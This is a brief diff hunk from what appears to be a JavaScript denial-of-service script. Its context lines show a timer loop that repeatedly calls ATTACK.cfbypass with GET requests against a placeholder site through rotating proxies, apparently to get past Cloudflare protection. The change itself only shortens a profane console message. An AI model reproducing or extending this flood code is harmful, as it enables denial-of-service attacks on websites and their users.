@@ -346,4 +346,4 @@ setInterval(function() {
     ATTACK.cfbypass('GET', 'https://site-here.com/', proxies[theproxy]);
 });
 
-console.log('CloudFlare Fucker Sent!!');
+console.log('Sent!');
